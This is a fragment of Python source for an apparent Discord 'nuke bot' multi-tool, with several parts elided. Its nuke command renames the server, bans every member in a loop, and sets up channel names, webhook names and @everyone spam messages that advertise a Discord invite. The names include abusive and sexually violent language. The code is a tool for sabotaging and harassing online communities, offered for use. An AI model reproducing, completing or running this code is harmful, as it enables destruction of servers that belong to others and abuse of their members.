def run_bot(token):
    #made by DEREK :) converted into a multi tool by cmoss
    import discord
    import asyncio
    import colorama
    import json
...
""")
    ...
    async def nuke(ctx, amount=50):
        ...
        await ctx.guild.edit(name="We RETURN | L&V")
        ...
        for i in range(100):  
            ...
            for member in list (ctx.guild.members):
                try:
                    await member.ban(reason="XR Nuke Bot")
    ...
    channel_names = ['RAPED BY LESTER', 'VERNIX TEAM ONTOP', 'GTA 5 LESTER', 'L&V OP', 'FUCK U']
    message_spam = ['@everyone VERNIX AND LESTER RUN YOU ALL', '@everyone L&V FUCKING RUN YOU HAHAHA https://discord.gg/m7TUywxAMu', '@everyone FUCKING JOIN AND BEG FOR MERCY https://discord.gg/m7TUywxAMu', '@everyone FUCKED BY L&V https://discord.gg/m7TUywxAMu']
    webhook_names = ['L&V RUN THIS SHIT', 'IMAGINE GETTING NUKED']
